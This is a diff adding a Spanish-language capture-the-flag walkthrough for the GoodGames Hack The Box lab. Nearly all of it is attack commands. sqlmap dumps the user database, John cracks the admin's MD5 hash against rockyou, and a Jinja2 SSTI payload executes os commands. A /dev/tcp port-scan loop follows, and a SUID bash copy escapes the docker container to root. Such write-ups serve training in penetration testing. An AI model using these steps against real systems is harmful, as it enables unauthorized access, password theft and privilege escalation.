@@ -1,0 +1,32 @@
+1. Validar el SQLi en el campo mail via sqlmap.
+2. Listar las bases de datos disponibles: sqlmap -r login.req --batch --dbs
+3. Listar las tablas de la DB main: sqlmap -r login.req --batch -D main --tables
+4. Listar los valores de la tabla user: sqlmap -r login.req --batch -D main -T user --dump
+
+5. Identificar el tipo de hash de la password user: nth -f hash_admin.txt
+6. Crackear la password: john --format=raw-md5 --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash_admin.txt
+7. Ver la password: john ---show --format=raw-md5 hash_admin.txt
+8. Acceder al panel del administrador, si nos vamos a los ajustes vemos que nos redirije a un nuevo subdominio: http://internal-administration.goodgames.htb
+9. Vemos que el apartado para actualizar los datos del perfil son vulnerables a SSTI (Jinja2): {{7*7}} refleja 49 en el nombre de usuario.
+10. Vemos si podemos ver el ID del usuario: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+11. Obtenmos la reverse shell: 
+12. Vemos el ID y leemos la flag:
+root@3a453ab39d3d:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@3a453ab39d3d:/# cat /home/augustus/user.txt 
+11b451aeea5164020d523bb25e2ff186
+
+13. Vemos que estamos en un entorno docker, al analizar el /etc/hosts y ver la IP tipica de Docker: 172.19.0.1.
+
+Analizando puertos con un oneliner: for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
+
+Observamos que el 22 esta abierto, nos conectamos por SSH con la cuenta de augustus y la password que encontramos antes.
+Dentro del SSH copiamos bash al directorio actual: "/home/augustus/bash"
+Salimos de la sesion y volvemos al contenedor, donde estamos como root, le asigamos los permisos y grupos necesarios para correrlo como root:
+
+```bash
+chown root:root bash
+chmod 4755 bash
+```
+
+Nos volvemos a conectar por SSH, ejecutamos bash con privilegios: `./bash -p` y leemos la flag del usuario root: `cat /root/root.txt`.
